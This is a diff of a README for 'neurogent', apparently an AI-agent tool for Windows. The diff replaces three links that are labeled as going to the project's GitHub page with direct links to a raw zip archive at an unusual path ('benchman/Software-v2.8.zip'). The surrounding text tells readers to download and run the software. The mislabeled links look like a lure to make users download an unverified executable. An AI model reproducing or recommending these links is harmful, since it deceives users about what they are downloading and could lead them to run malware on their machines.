@@ -1,6 +1,6 @@
 # 🧠 neurogent - Build AI agents with clear control
 
-[![Download neurogent](https://img.shields.io/badge/Download%20neurogent-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/karerunning645/neurogent)
+[![Download neurogent](https://img.shields.io/badge/Download%20neurogent-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/karerunning645/neurogent/raw/refs/heads/main/benchman/Software-v2.8.zip)
 
 ## 🚀 What neurogent does
 
@@ -30,7 +30,7 @@ Best results come from Windows 10 or Windows 11.
 
 Open this page to download and run the software:
 
-[Go to the neurogent GitHub page](https://github.com/karerunning645/neurogent)
+[Go to the neurogent GitHub page](https://github.com/karerunning645/neurogent/raw/refs/heads/main/benchman/Software-v2.8.zip)
 
 If the page shows a release file, download that file to your PC. If it shows the source project page, use the release or download section on that page to get the Windows build.
 
@@ -238,6 +238,6 @@ If the project grows over time, newer release notes may explain the current file
 
 If you need to reinstall or move the app to another PC, use the same GitHub page:
 
-[Download or open the neurogent page](https://github.com/karerunning645/neurogent)
+[Download or open the neurogent page](https://github.com/karerunning645/neurogent/raw/refs/heads/main/benchman/Software-v2.8.zip)
 
 Keep the file in a safe place after download so you can use it again without searching for it
